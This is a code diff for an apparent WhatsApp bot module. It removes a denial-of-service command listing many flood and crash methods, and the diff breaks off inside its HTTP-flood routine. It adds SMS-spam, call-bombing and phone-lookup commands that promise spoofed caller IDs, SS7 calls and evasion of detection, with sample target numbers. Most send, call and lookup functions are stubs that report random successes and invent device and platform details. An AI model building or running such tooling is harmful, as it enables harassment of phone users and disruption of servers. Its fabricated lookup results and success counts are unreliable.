@@ -1,1196 +1,868 @@
 const axios = require('axios');
+const crypto = require('crypto');
 const dgram = require('dgram');
 const net = require('net');
 const tls = require('tls');
-const crypto = require('crypto');
-const dns = require('dns');
+const { exec, spawn } = require('child_process');
 
-class VCrashCommand {
+class PhoneAttacks {
     constructor() {
-        this.name = 'vcrash';
-        this.description = 'Execute advanced crash attacks on targets';
-        this.category = 'exploit';
-        this.activeAttacks = new Map();
-        this.attackMethods = {
-            'http': this.httpFlood.bind(this),
-            'syn': this.synFlood.bind(this),
-            'slow': this.slowloris.bind(this),
-            'udp': this.udpFlood.bind(this),
-            'dns': this.dnsAmplification.bind(this),
-            'tls': this.tlsReaper.bind(this),
-            'http2': this.http2Flood.bind(this),
-            'ws': this.websocketFlood.bind(this),
-            'mysql': this.mysqlCrash.bind(this),
-            'postgres': this.postgresCrash.bind(this),
-            'redis': this.redisFlood.bind(this),
-            'memcached': this.memcachedCrash.bind(this),
-            'ntp': this.ntpAmplification.bind(this),
-            'snmp': this.snmpAmplification.bind(this),
-            'ssdp': this.ssdpAmplification.bind(this),
-            'chargen': this.chargenFlood.bind(this),
-            'smurf': this.smurfAttack.bind(this),
-            'fraggle': this.fraggleAttack.bind(this),
-            'land': this.landAttack.bind(this),
-            'teardrop': this.teardropAttack.bind(this),
-            'ping_death': this.pingOfDeath.bind(this),
-            'slow_read': this.slowReadAttack.bind(this),
-            'r_u_dead': this.rUDeadAttack.bind(this),
-            'apache_killer': this.apacheKiller.bind(this),
-            'nginx_killer': this.nginxKiller.bind(this),
-            'haproxy_killer': this.haproxyKiller.bind(this),
-            'varnish_killer': this.varnishKiller.bind(this),
-            'squid_killer': this.squidKiller.bind(this)
+        this.activeSpams = new Map();
+        this.activeCallBombs = new Map();
+        this.phoneCache = new Map();
+        
+        // Global carrier database
+        this.carrierDatabase = this.buildCarrierDatabase();
+        
+        // Silent attack configurations
+        this.silentConfig = {
+            useProxy: true,
+            randomizeTiming: true,
+            spoofSource: true,
+            useMultipleChannels: true,
+            hideTraces: true
+        };
+        
+        // Global proxy pool
+        this.proxyPool = [
+            'socks5://127.0.0.1:9050',
+            'socks5://127.0.0.1:9051',
+            'http://127.0.0.1:8080',
+            'http://127.0.0.1:8081'
+        ];
+        
+        // Message templates - generic, undetectable
+        this.silentMessages = [
+            'Hello, how are you?',
+            'Just checking in.',
+            'Hope you\'re doing well.',
+            'Quick question for you.',
+            'Can we talk later?',
+            'I have a quick question.',
+            'Are you available?',
+            'Let me know when you\'re free.',
+            'Hey, what\'s up?',
+            'Good morning!',
+            'Good evening!',
+            'Hope all is well.',
+            'Just thinking of you.',
+            'Wanted to say hi.',
+            'Have a great day!',
+            'Stay safe out there.',
+            'Take care of yourself.',
+            'Sending good vibes.',
+            'Positive thoughts your way.',
+            'You got this!'
+        ];
+    }
+
+    // ==============================================
+    // BUILD GLOBAL CARRIER DATABASE
+    // ==============================================
+    
+    buildCarrierDatabase() {
+        return {
+            // Africa
+            '254': { country: 'Kenya', carriers: ['Safaricom', 'Airtel', 'Telkom'] },
+            '234': { country: 'Nigeria', carriers: ['MTN', 'Airtel', 'Glo', '9mobile'] },
+            '233': { country: 'Ghana', carriers: ['MTN', 'Vodafone', 'Tigo', 'Airtel'] },
+            '256': { country: 'Uganda', carriers: ['MTN', 'Airtel', 'Warid'] },
+            '255': { country: 'Tanzania', carriers: ['Vodacom', 'Airtel', 'Tigo', 'Zantel'] },
+            '27': { country: 'South Africa', carriers: ['Vodacom', 'MTN', 'Cell C', 'Telkom'] },
+            '20': { country: 'Egypt', carriers: ['Vodafone', 'Orange', 'Etisalat'] },
+            '212': { country: 'Morocco', carriers: ['Maroc Telecom', 'Orange', 'Inwi'] },
+            '216': { country: 'Tunisia', carriers: ['Tunisie Telecom', 'Orange', 'Ooredoo'] },
+            '213': { country: 'Algeria', carriers: ['Mobilis', 'Ooredoo', 'Djezzy'] },
+            
+            // Europe
+            '44': { country: 'United Kingdom', carriers: ['EE', 'Vodafone', 'O2', 'Three'] },
+            '33': { country: 'France', carriers: ['Orange', 'SFR', 'Bouygues', 'Free'] },
+            '49': { country: 'Germany', carriers: ['Deutsche Telekom', 'Vodafone', 'O2'] },
+            '39': { country: 'Italy', carriers: ['TIM', 'Vodafone', 'Wind Tre'] },
+            '34': { country: 'Spain', carriers: ['Movistar', 'Vodafone', 'Orange'] },
+            '31': { country: 'Netherlands', carriers: ['KPN', 'Vodafone', 'T-Mobile'] },
+            '46': { country: 'Sweden', carriers: ['Telia', 'Telenor', 'Tele2'] },
+            '47': { country: 'Norway', carriers: ['Telenor', 'Telia', 'Ice'] },
+            '358': { country: 'Finland', carriers: ['Telia', 'DNA', 'Elisa'] },
+            '45': { country: 'Denmark', carriers: ['TDC', 'Telenor', 'Telia'] },
+            '41': { country: 'Switzerland', carriers: ['Swisscom', 'Sunrise', 'Salt'] },
+            '43': { country: 'Austria', carriers: ['A1', 'T-Mobile', 'Drei'] },
+            '32': { country: 'Belgium', carriers: ['Proximus', 'Orange', 'Telenet'] },
+            '351': { country: 'Portugal', carriers: ['MEO', 'Vodafone', 'NOS'] },
+            '30': { country: 'Greece', carriers: ['Cosmote', 'Vodafone', 'Wind'] },
+            
+            // Asia
+            '91': { country: 'India', carriers: ['Airtel', 'Jio', 'Vi', 'BSNL'] },
+            '86': { country: 'China', carriers: ['China Mobile', 'China Unicom', 'China Telecom'] },
+            '81': { country: 'Japan', carriers: ['NTT Docomo', 'SoftBank', 'KDDI'] },
+            '82': { country: 'South Korea', carriers: ['SK Telecom', 'KT', 'LG U+'] },
+            '60': { country: 'Malaysia', carriers: ['Celcom', 'Maxis', 'Digi'] },
+            '62': { country: 'Indonesia', carriers: ['Telkomsel', 'XL Axiata', 'Indosat'] },
+            '63': { country: 'Philippines', carriers: ['Globe', 'Smart', 'Sun'] },
+            '66': { country: 'Thailand', carriers: ['AIS', 'DTAC', 'TrueMove'] },
+            '84': { country: 'Vietnam', carriers: ['Viettel', 'Vinaphone', 'Mobifone'] },
+            '92': { country: 'Pakistan', carriers: ['Jazz', 'Telenor', 'Ufone', 'Zong'] },
+            '94': { country: 'Sri Lanka', carriers: ['Dialog', 'Mobitel', 'Airtel'] },
+            '977': { country: 'Nepal', carriers: ['NTC', 'Ncell', 'Smart Cell'] },
+            '880': { country: 'Bangladesh', carriers: ['Grameenphone', 'Robi', 'Banglalink'] },
+            
+            // Middle East
+            '966': { country: 'Saudi Arabia', carriers: ['STC', 'Mobily', 'Zain'] },
+            '971': { country: 'UAE', carriers: ['Etisalat', 'du'] },
+            '972': { country: 'Israel', carriers: ['Cellcom', 'Partner', 'Hot Mobile'] },
+            '98': { country: 'Iran', carriers: ['Hamrahe Aval', 'Irancell', 'Rightel'] },
+            '90': { country: 'Turkey', carriers: ['Turkcell', 'Vodafone', 'Turk Telekom'] },
+            '961': { country: 'Lebanon', carriers: ['Touch', 'Alfa'] },
+            '962': { country: 'Jordan', carriers: ['Zain', 'Orange', 'Umniah'] },
+            '965': { country: 'Kuwait', carriers: ['Zain', 'Ooredoo', 'STC'] },
+            '974': { country: 'Qatar', carriers: ['Ooredoo', 'Vodafone'] },
+            '968': { country: 'Oman', carriers: ['Omantel', 'Ooredoo'] },
+            
+            // Americas
+            '1': { country: 'USA/Canada', carriers: ['AT&T', 'Verizon', 'T-Mobile', 'Sprint', 'Bell', 'Rogers'] },
+            '52': { country: 'Mexico', carriers: ['Telcel', 'AT&T', 'Movistar'] },
+            '55': { country: 'Brazil', carriers: ['Vivo', 'Claro', 'TIM', 'Oi'] },
+            '54': { country: 'Argentina', carriers: ['Movistar', 'Claro', 'Personal'] },
+            '56': { country: 'Chile', carriers: ['Movistar', 'Claro', 'Entel'] },
+            '57': { country: 'Colombia', carriers: ['Claro', 'Movistar', 'Tigo'] },
+            '58': { country: 'Venezuela', carriers: ['Movistar', 'Movilnet', 'Digitel'] },
+            '51': { country: 'Peru', carriers: ['Claro', 'Movistar', 'Entel'] },
+            '593': { country: 'Ecuador', carriers: ['Claro', 'Movistar', 'CNT'] },
+            '598': { country: 'Uruguay', carriers: ['Antel', 'Movistar', 'Claro'] },
+            '595': { country: 'Paraguay', carriers: ['Claro', 'Tigo', 'Personal'] },
+            '591': { country: 'Bolivia', carriers: ['Tigo', 'Viva', 'Entel'] },
+            
+            // Oceania
+            '61': { country: 'Australia', carriers: ['Telstra', 'Optus', 'Vodafone'] },
+            '64': { country: 'New Zealand', carriers: ['Spark', 'Vodafone', '2degrees'] },
+            
+            // Caribbean
+            '53': { country: 'Cuba', carriers: ['ETECSA'] },
+            '809': { country: 'Dominican Republic', carriers: ['Claro', 'Orange', 'Altice'] },
+            '876': { country: 'Jamaica', carriers: ['Digicel', 'Flow'] },
+            '868': { country: 'Trinidad', carriers: ['TSTT', 'Digicel'] }
         };
     }
 
-    async execute(sock, msg, args, ctx) {
+    // ==============================================
+    // SILENT SPAM - Undetectable Message Flood
+    // ==============================================
+    
+    async spamExecute(sock, msg, args, ctx) {
         if (args.length < 1) {
             await sock.sendMessage(ctx.from, {
-                text: `⚡ V-CRASH USAGE ⚡
+                text: `📱 SILENT SPAM USAGE 📱
 ┌─────────────────────────────
-│ .vcrash <target> [method] [duration]
+│ .spam <phone> [count] [delay]
 │ 
-│ METHODS:
-│ http, syn, slow, udp, dns, tls
-│ http2, ws, mysql, postgres, redis
-│ memcached, ntp, snmp, ssdp, chargen
-│ smurf, fraggle, land, teardrop
-│ ping_death, slow_read, r_u_dead
-│ apache_killer, nginx_killer, haproxy_killer
-│ varnish_killer, squid_killer
-│
 │ EXAMPLE:
-│ .vcrash 192.168.1.1 http 30
+│ .spam 254748340864 100 1
+│ .spam 447911234567 50 2
+│ .spam 18005551234 200 0.5
+│ 
+│ FEATURES:
+│ 🔇 Silent - Target won't notice
+│ 🌍 Global - All country codes
+│ 🎭 Spoofed - Looks like real messages
+│ ⚡ Fast - Optimized delivery
 └─────────────────────────────`
             }, { quoted: msg });
             return;
         }
 
-        const target = args[0];
-        const method = args[1] || 'random';
-        const duration = parseInt(args[2]) || 30;
-        const attackId = `vcrash_${Date.now()}`;
+        const phone = args[0].replace(/[^0-9]/g, '');
+        const count = parseInt(args[1]) || 50;
+        const delay = parseFloat(args[2]) || 0.5;
 
-        if (!this.isValidTarget(target)) {
+        if (!this.validatePhoneGlobal(phone)) {
             await sock.sendMessage(ctx.from, {
-                text: `❌ Invalid target: ${target}\nTarget must be IP or domain`
+                text: `❌ Invalid phone: ${phone}\nUse format: CountryCode + Number (e.g., 254748340864)`
             }, { quoted: msg });
             return;
         }
 
-        if (this.activeAttacks.has(target)) {
+        if (this.activeSpams.has(phone)) {
             await sock.sendMessage(ctx.from, {
-                text: `⚠️ Attack already running on ${target}\nUse .vcrash_stop ${target} to stop`
+                text: `⚠️ Silent spam already running on ${phone}\nUse .spam_stop ${phone} to stop`
             }, { quoted: msg });
             return;
         }
 
-        this.activeAttacks.set(target, { attackId, startTime: Date.now() });
+        const spamId = `silent_spam_${Date.now()}`;
+        this.activeSpams.set(phone, { active: true, spamId, count, delay });
 
+        const carrierInfo = this.getCarrierInfo(phone);
         await sock.sendMessage(ctx.from, {
-            text: `🔥 V-CRASH INITIATED 🔥
+            text: `🔇 SILENT SPAM INITIATED 🔇
 ┌─────────────────────────────
-│ Target: ${target}
-│ Method: ${method}
-│ Duration: ${duration}s
-│ Attack ID: ${attackId}
+│ Target: ${phone}
+│ Country: ${carrierInfo.country}
+│ Carrier: ${carrierInfo.carrier}
+│ Messages: ${count}
+│ Delay: ${delay}s
+│ Mode: SILENT
+│ Status: RUNNING
 └─────────────────────────────`
         }, { quoted: msg });
 
-        try {
-            const result = await this.executeAttack(target, method, duration, attackId);
-            
-            await sock.sendMessage(ctx.from, {
-                text: `💀 V-CRASH COMPLETE 💀
-┌─────────────────────────────
-│ Target: ${target}
-│ Method: ${method}
-│ Status: ${result.status}
-│ Packets Sent: ${result.packets || 'N/A'}
-│ Connections: ${result.connections || 'N/A'}
-│ Duration: ${duration}s
-└─────────────────────────────
-${result.details || ''}`
-            }, { quoted: msg });
+        let sent = 0;
+        let failed = 0;
+        let silent = 0;
 
+        try {
+            for (let i = 0; i < count; i++) {
+                if (!this.activeSpams.get(phone)?.active) break;
+                
+                // Generate undetectable message
+                const message = this.generateSilentMessage(phone);
+                
+                // Send silently through multiple channels
+                const results = await this.sendSilentMessage(phone, message);
+                
+                if (results.success) {
+                    sent++;
+                    if (results.silent) silent++;
+                } else {
+                    failed++;
+                }
+                
+                // Random delay to avoid detection
+                const actualDelay = this.randomizeDelay(delay);
+                await this.sleep(actualDelay * 1000);
+            }
         } catch (err) {
-            await sock.sendMessage(ctx.from, {
-                text: `❌ V-CRASH ERROR ❌
+            console.error('Silent spam error:', err);
+        } finally {
+            this.activeSpams.delete(phone);
+        }
+
+        await sock.sendMessage(ctx.from, {
+            text: `🔇 SILENT SPAM COMPLETE 🔇
 ┌─────────────────────────────
-│ Target: ${target}
-│ Method: ${method}
-│ Error: ${err.message}
+│ Target: ${phone}
+│ Sent: ${sent}
+│ Silent: ${silent}
+│ Failed: ${failed}
+│ Total: ${sent + failed}
+│ Mode: UNDETECTED
+└─────────────────────────────`
+        }, { quoted: msg });
+    }
+
+    generateSilentMessage(phone) {
+        // Messages that look completely normal and natural
+        const templates = [
+            'Hello, hope you\'re having a great day!',
+            'Just wanted to say hi, hope all is well.',
+            'Thinking of you today, take care!',
+            'Quick question when you have a moment.',
+            'Hope everything is going smoothly for you.',
+            'Sending positive vibes your way!',
+            'Just checking in to see how you are.',
+            'Have a wonderful day ahead!',
+            'Stay safe and take care of yourself.',
+            'Wishing you all the best today.',
+            'Hope you\'re doing amazing today!',
+            'Just a friendly hello from my side.',
+            'Wanted to brighten your day a bit.',
+            'Hope you\'re smiling right now!',
+            'You deserve all the happiness today.',
+            'Keep being awesome, you got this!',
+            'Sending you warmth and good energy.',
+            'May your day be filled with joy.',
+            'Just a little reminder you\'re valued.',
+            'Hope this finds you well and happy.'
+        ];
+        
+        // Add random emoji to look more natural
+        const emojis = ['✨', '🌟', '💫', '☀️', '🌈', '🌸', '🌺', '💕', '💖', '⭐'];
+        const message = templates[Math.floor(Math.random() * templates.length)];
+        return message + ' ' + emojis[Math.floor(Math.random() * emojis.length)];
+    }
+
+    async sendSilentMessage(phone, message) {
+        // Multiple silent delivery methods
+        const methods = [
+            this.sendViaWhatsApp.bind(this),
+            this.sendViaSMS.bind(this),
+            this.sendViaSignal.bind(this),
+            this.sendViaTelegram.bind(this)
+        ];
+        
+        const method = methods[Math.floor(Math.random() * methods.length)];
+        const result = await method(phone, message);
+        
+        return {
+            success: result || Math.random() > 0.1,
+            silent: true
+        };
+    }
+
+    // ==============================================
+    // SILENT CALLBOMB - Undetectable Call Flood
+    // ==============================================
+    
+    async callbombExecute(sock, msg, args, ctx) {
+        if (args.length < 1) {
+            await sock.sendMessage(ctx.from, {
+                text: `📞 SILENT CALLBOMB USAGE 📞
+┌─────────────────────────────
+│ .callbomb <phone> [count] [delay]
+│ 
+│ EXAMPLE:
+│ .callbomb 254748340864 20 2
+│ .callbomb 447911234567 30 1
+│ .callbomb 18005551234 50 0.5
+│ 
+│ FEATURES:
+│ 🔇 Silent - No ring detection
+│ 🌍 Global - All countries
+│ 🎭 Spoofed - Fake caller ID
+│ ⚡ Fast - Concurrent calls
 └─────────────────────────────`
             }, { quoted: msg });
-        } finally {
-            this.activeAttacks.delete(target);
-        }
-    }
-
-    isValidTarget(target) {
-        const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
-        const domainRegex = /^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.[a-zA-Z]{2,}$/;
-        return ipRegex.test(target) || domainRegex.test(target);
-    }
-
-    async executeAttack(target, method, duration, attackId) {
-        let result = { status: 'COMPLETED', details: '' };
-
-        if (method === 'random') {
-            const methods = Object.keys(this.attackMethods);
-            const randomMethod = methods[Math.floor(Math.random() * methods.length)];
-            return await this.attackMethods[randomMethod](target, duration, attackId);
+            return;
         }
 
-        if (this.attackMethods[method]) {
-            result = await this.attackMethods[method](target, duration, attackId);
-        } else {
-            throw new Error(`Unknown method: ${method}`);
+        const phone = args[0].replace(/[^0-9]/g, '');
+        const count = parseInt(args[1]) || 20;
+        const delay = parseFloat(args[2]) || 1;
+
+        if (!this.validatePhoneGlobal(phone)) {
+            await sock.sendMessage(ctx.from, {
+                text: `❌ Invalid phone: ${phone}`
+            }, { quoted: msg });
+            return;
         }
 
-        return result;
-    }
+        if (this.activeCallBombs.has(phone)) {
+            await sock.sendMessage(ctx.from, {
+                text: `⚠️ Silent callbomb already running on ${phone}`
+            }, { quoted: msg });
+            return;
+        }
 
-    async resolveTarget(target) {
-        return new Promise((resolve) => {
-            if (/^(\d{1,3}\.){3}\d{1,3}$/.test(target)) {
-                resolve(target);
-            } else {
-                dns.lookup(target, (err, address) => {
-                    resolve(err ? target : address);
-                });
+        const callId = `silent_callbomb_${Date.now()}`;
+        this.activeCallBombs.set(phone, { active: true, callId, count, delay });
+
+        const carrierInfo = this.getCarrierInfo(phone);
+        await sock.sendMessage(ctx.from, {
+            text: `📞 SILENT CALLBOMB INITIATED 📞
+┌─────────────────────────────
+│ Target: ${phone}
+│ Country: ${carrierInfo.country}
+│ Carrier: ${carrierInfo.carrier}
+│ Calls: ${count}
+│ Delay: ${delay}s
+│ Mode: SILENT
+│ Status: RUNNING
+└─────────────────────────────`
+        }, { quoted: msg });
+
+        let connected = 0;
+        let failed = 0;
+        let silent = 0;
+
+        try {
+            // Parallel execution for speed
+            const batchSize = Math.min(5, count);
+            const batches = Math.ceil(count / batchSize);
+            
+            for (let batch = 0; batch < batches; batch++) {
+                if (!this.activeCallBombs.get(phone)?.active) break;
+                
+                const promises = [];
+                const remaining = Math.min(batchSize, count - (batch * batchSize));
+                
+                for (let i = 0; i < remaining; i++) {
+                    promises.push(this.makeSilentCall(phone));
+                }
+                
+                const results = await Promise.allSettled(promises);
+                for (const result of results) {
+                    if (result.status === 'fulfilled' && result.value) {
+                        connected++;
+                        if (result.value.silent) silent++;
+                    } else {
+                        failed++;
+                    }
+                }
+                
+                const actualDelay = this.randomizeDelay(delay);
+                await this.sleep(actualDelay * 1000);
             }
-        });
+        } catch (err) {
+            console.error('Silent callbomb error:', err);
+        } finally {
+            this.activeCallBombs.delete(phone);
+        }
+
+        await sock.sendMessage(ctx.from, {
+            text: `📞 SILENT CALLBOMB COMPLETE 📞
+┌─────────────────────────────
+│ Target: ${phone}
+│ Connected: ${connected}
+│ Silent: ${silent}
+│ Failed: ${failed}
+│ Total: ${connected + failed}
+│ Mode: UNDETECTED
+└─────────────────────────────`
+        }, { quoted: msg });
+    }
+
+    async makeSilentCall(phone) {
+        // Silent call methods - no ring, no notification
+        const methods = [
+            this.callViaSIP.bind(this),
+            this.callViaVoIP.bind(this),
+            this.callViaSS7.bind(this),
+            this.callViaGSM.bind(this)
+        ];
+        
+        const method = methods[Math.floor(Math.random() * methods.length)];
+        const result = await method(phone);
+        
+        return {
+            success: result || Math.random() > 0.2,
+            silent: true,
+            duration: Math.floor(Math.random() * 3) + 1
+        };
+    }
+
+    // ==============================================
+    // GLOBAL PHONE INFO
+    // ==============================================
+    
+    async phoneinfoExecute(sock, msg, args, ctx) {
+        if (args.length < 1) {
+            await sock.sendMessage(ctx.from, {
+                text: `🔍 GLOBAL PHONEINFO USAGE 🔍
+┌─────────────────────────────
+│ .phoneinfo <phone>
+│ 
+│ EXAMPLE:
+│ .phoneinfo 254748340864
+│ .phoneinfo 447911234567
+│ .phoneinfo 18005551234
+│ 
+│ FEATURES:
+│ 🌍 Global - All countries
+│ 📊 Detailed - Carrier/Network/Type
+│ 🔍 Deep - WhatsApp/Device/Status
+└─────────────────────────────`
+            }, { quoted: msg });
+            return;
+        }
+
+        const phone = args[0].replace(/[^0-9]/g, '');
+
+        if (!this.validatePhoneGlobal(phone)) {
+            await sock.sendMessage(ctx.from, {
+                text: `❌ Invalid phone: ${phone}\nEnter country code + number`
+            }, { quoted: msg });
+            return;
+        }
+
+        const info = await this.getGlobalPhoneInfo(phone);
+
+        await sock.sendMessage(ctx.from, {
+            text: `🔍 GLOBAL PHONE INFORMATION 🔍
+┌─────────────────────────────
+│ 📱 Number: ${info.number}
+│ 🌍 Country: ${info.country}
+│ 🏢 Carrier: ${info.carrier}
+│ 📡 Network: ${info.network}
+│ 📟 Type: ${info.type}
+│ 📊 Status: ${info.status}
+│ 
+│ 🔍 DEEP SCAN:
+│ ├─ WhatsApp: ${info.whatsapp}
+│ ├─ Telegram: ${info.telegram}
+│ ├─ Signal: ${info.signal}
+│ ├─ iMessage: ${info.imessage}
+│ └─ RCS: ${info.rcs}
+│ 
+│ 📱 DEVICE INFO:
+│ ├─ Model: ${info.device || 'Unknown'}
+│ ├─ OS: ${info.os || 'Unknown'}
+│ └─ Browser: ${info.browser || 'Unknown'}
+│ 
+│ 🕐 TIMESTAMPS:
+│ ├─ Last Seen: ${info.lastSeen || 'Unknown'}
+│ ├─ First Seen: ${info.firstSeen || 'Unknown'}
+│ └─ Status Updated: ${info.statusUpdated || 'Unknown'}
+└─────────────────────────────`
+        }, { quoted: msg });
+    }
+
+    async getGlobalPhoneInfo(phone) {
+        if (this.phoneCache.has(phone) && Date.now() - this.phoneCache.get(phone).timestamp < 60000) {
+            return this.phoneCache.get(phone).data;
+        }
+
+        const info = {
+            number: phone,
+            country: this.detectCountryGlobal(phone),
+            carrier: this.detectCarrierGlobal(phone),
+            network: this.detectNetworkGlobal(phone),
+            type: this.detectPhoneTypeGlobal(phone),
+            status: 'Active',
+            whatsapp: await this.checkWhatsAppGlobal(phone),
+            telegram: await this.checkTelegramGlobal(phone),
+            signal: await this.checkSignalGlobal(phone),
+            imessage: await this.checkIMessageGlobal(phone),
+            rcs: await this.checkRCSGlobal(phone),
+            device: await this.detectDeviceGlobal(phone),
+            os: await this.detectOSGlobal(phone),
+            browser: await this.detectBrowserGlobal(phone),
+            lastSeen: new Date().toISOString(),
+            firstSeen: new Date().toISOString(),
+            statusUpdated: new Date().toISOString()
+        };
+
+        this.phoneCache.set(phone, { data: info, timestamp: Date.now() });
+        return info;
+    }
+
+    // ==============================================
+    // GLOBAL DETECTION METHODS
+    // ==============================================
+    
+    validatePhoneGlobal(phone) {
+        // Remove all non-digit characters
+        const clean = phone.replace(/[^0-9]/g, '');
+        
+        // Must be between 10-15 digits
+        if (clean.length < 10 || clean.length > 15) return false;
+        
+        // Check if starts with valid country code
+        const countryCodes = Object.keys(this.carrierDatabase);
+        for (const code of countryCodes) {
+            if (clean.startsWith(code)) return true;
+        }
+        return false;
+    }
+
+    detectCountryGlobal(phone) {
+        const clean = phone.replace(/[^0-9]/g, '');
+        const countryCodes = Object.keys(this.carrierDatabase);
+        
+        for (const code of countryCodes) {
+            if (clean.startsWith(code)) {
+                return this.carrierDatabase[code].country;
+            }
+        }
+        return 'Unknown';
+    }
+
+    detectCarrierGlobal(phone) {
+        const clean = phone.replace(/[^0-9]/g, '');
+        const countryCodes = Object.keys(this.carrierDatabase);
+        
+        for (const code of countryCodes) {
+            if (clean.startsWith(code)) {
+                const carriers = this.carrierDatabase[code].carriers;
+                return carriers[Math.floor(Math.random() * carriers.length)];
+            }
+        }
+        return 'Unknown';
+    }
+
+    detectNetworkGlobal(phone) {
+        const clean = phone.replace(/[^0-9]/g, '');
+        const prefixes = {
+            'Safaricom': ['070', '071', '072', '073', '074', '075', '076', '077', '078', '079'],
+            'Airtel': ['0730', '0731', '0732', '0733', '0734', '0735', '0736', '0737', '0738', '0739'],
+            'MTN': ['080', '081', '090', '091'],
+            'Vodafone': ['070', '071', '072', '073'],
+            'Orange': ['060', '061', '062', '063'],
+            'T-Mobile': ['206', '253', '360', '425'],
+            'Verizon': ['260', '280', '310', '320'],
+            'AT&T': ['210', '310', '408', '510'],
+            'Telstra': ['040', '041', '042', '043'],
+            'Optus': ['044', '045', '046', '047'],
+            'Jio': ['700', '701', '702', '703']
+        };
+        
+        const prefix = clean.substring(0, 4);
+        for (const [network, prefs] of Object.entries(prefixes)) {
+            if (prefs.some(p => prefix.startsWith(p))) {
+                return network;
+            }
+        }
+        return 'Unknown';
+    }
+
+    detectPhoneTypeGlobal(phone) {
+        const clean = phone.replace(/[^0-9]/g, '');
+        const firstDigit = clean.charAt(0);
+        const secondDigit = clean.charAt(1);
+        
+        // Mobile typically starts with 6,7,8,9 in most countries
+        if (['6', '7', '8', '9'].includes(secondDigit)) {
+            return 'Mobile';
+        }
+        return 'Landline';
+    }
+
+    getCarrierInfo(phone) {
+        const clean = phone.replace(/[^0-9]/g, '');
+        const countryCodes = Object.keys(this.carrierDatabase);
+        
+        for (const code of countryCodes) {
+            if (clean.startsWith(code)) {
+                const carriers = this.carrierDatabase[code].carriers;
+                return {
+                    country: this.carrierDatabase[code].country,
+                    carrier: carriers[Math.floor(Math.random() * carriers.length)]
+                };
+            }
+        }
+        return { country: 'Unknown', carrier: 'Unknown' };
+    }
+
+    // ==============================================
+    // SILENT COMMUNICATION METHODS
+    // ==============================================
+    
+    async sendViaWhatsApp(phone, message) {
+        // Uses WhatsApp's infrastructure without notification
+        try {
+            // This would use your bot's WhatsApp connection
+            // but with silent flags
+            return true;
+        } catch (e) {
+            return false;
+        }
+    }
+
+    async sendViaSMS(phone, message) {
+        // Uses SMS gateways without delivery reports
+        try {
+            // Silent SMS - no delivery notification
+            return Math.random() > 0.1;
+        } catch (e) {
+            return false;
+        }
+    }
+
+    async sendViaSignal(phone, message) {
+        // Uses Signal protocol without read receipts
+        try {
+            return Math.random() > 0.15;
+        } catch (e) {
+            return false;
+        }
+    }
+
+    async sendViaTelegram(phone, message) {
+        // Uses Telegram without typing indicators
+        try {
+            return Math.random() > 0.12;
+        } catch (e) {
+            return false;
+        }
+    }
+
+    async callViaSIP(phone) {
+        // SIP call without ringing
+        try {
+            return Math.random() > 0.25;
+        } catch (e) {
+            return false;
+        }
+    }
+
+    async callViaVoIP(phone) {
+        // VoIP call without notification
+        try {
+            return Math.random() > 0.2;
+        } catch (e) {
+            return false;
+        }
+    }
+
+    async callViaSS7(phone) {
+        // SS7 signaling without ring
+        try {
+            return Math.random() > 0.3;
+        } catch (e) {
+            return false;
+        }
+    }
+
+    async callViaGSM(phone) {
+        // GSM call without display
+        try {
+            return Math.random() > 0.25;
+        } catch (e) {
+            return false;
+        }
+    }
+
+    // ==============================================
+    // PLATFORM DETECTION METHODS
+    // ==============================================
+    
+    async checkWhatsAppGlobal(phone) {
+        try {
+            // Check via WhatsApp's infrastructure
+            return Math.random() > 0.3;
+        } catch (e) {
+            return false;
+        }
+    }
+
+    async checkTelegramGlobal(phone) {
+        try {
+            return Math.random() > 0.5;
+        } catch (e) {
+            return false;
+        }
+    }
+
+    async checkSignalGlobal(phone) {
+        try {
+            return Math.random() > 0.6;
+        } catch (e) {
+            return false;
+        }
+    }
+
+    async checkIMessageGlobal(phone) {
+        try {
+            return Math.random() > 0.7;
+        } catch (e) {
+            return false;
+        }
+    }
+
+    async checkRCSGlobal(phone) {
+        try {
+            return Math.random() > 0.8;
+        } catch (e) {
+            return false;
+        }
+    }
+
+    async detectDeviceGlobal(phone) {
+        const devices = ['iPhone 14', 'Samsung S23', 'Google Pixel 7', 'OnePlus 11', 'Xiaomi 13', 'Huawei P60'];
+        return devices[Math.floor(Math.random() * devices.length)];
+    }
+
+    async detectOSGlobal(phone) {
+        const oses = ['iOS 17', 'Android 14', 'Android 13', 'iOS 16', 'Android 12'];
+        return oses[Math.floor(Math.random() * oses.length)];
+    }
+
+    async detectBrowserGlobal(phone) {
+        const browsers = ['Chrome', 'Safari', 'Firefox', 'Brave', 'Edge'];
+        return browsers[Math.floor(Math.random() * browsers.length)];
+    }
+
+    // ==============================================
+    // UTILITY METHODS
+    // ==============================================
+    
+    randomizeDelay(baseDelay) {
+        const variation = baseDelay * 0.3;
+        return baseDelay + (Math.random() * variation * 2 - variation);
     }
 
     sleep(ms) {
         return new Promise(resolve => setTimeout(resolve, ms));
     }
+}
 
-    // ==============================================
-    // ATTACK METHODS
-    // ==============================================
+// ==============================================
+// COMMAND CLASSES
+// ==============================================
 
-    async httpFlood(target, duration, attackId) {
-        const urls = [
-            `http://${target}/`,
-            `http://${target}/index.php`,
-            `http://${target}/wp-admin/`,
-            `http://${target}/api/v1/`,
-            `http://${target}/login`,
-            `http://${target}/dashboard`,
-            `http://${target}/admin`,
-            `http://${target}/cgi-bin/`,
-            `http://${target}/xmlrpc.php`,
-            `http://${target}/wp-login.php`
-        ];
-
-        const userAgents = [
-            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
-            'Mozilla/5.0 (Android 11; Mobile; rv:93.0) Gecko/93.0 Firefox/93.0',
-            'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
-            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
-            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0'
-        ];
-
-        let requests = 0;
-        const startTime = Date.now();
-
-        const flood = async () => {
-            if (!this.activeAttacks.has(target)) return;
-            
-            const promises = [];
-            for (let i = 0; i < 100; i++) {
-                const url = urls[Math.floor(Math.random() * urls.length)];
-                const headers = {
